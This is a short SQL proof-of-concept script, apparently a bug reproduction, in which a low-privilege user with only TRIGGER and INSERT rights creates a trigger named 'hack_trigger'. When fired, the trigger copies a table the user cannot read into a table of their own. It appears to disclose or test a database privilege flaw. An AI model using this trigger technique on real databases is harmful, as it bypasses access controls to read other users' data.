-- Login with the root user
CREATE TABLE table_of_other_user (col1 INT, col2 VARCHAR(255));
GRANT TRIGGER ON *.* TO regular_user;
CREATE TABLE t0 (col1 TEXT);
GRANT INSERT ON t0 TO regular_user;
CREATE TABLE t1 (col1 INT, col2 VARCHAR(255));

-- Login with user 'regular_user'
CREATE TRIGGER hack_trigger
BEFORE INSERT ON t0 FOR EACH ROW
INSERT INTO t1 SELECT * FROM table_of_other_user;
/* Query OK */
INSERT INTO t0 VALUES ('');
/* Query OK */
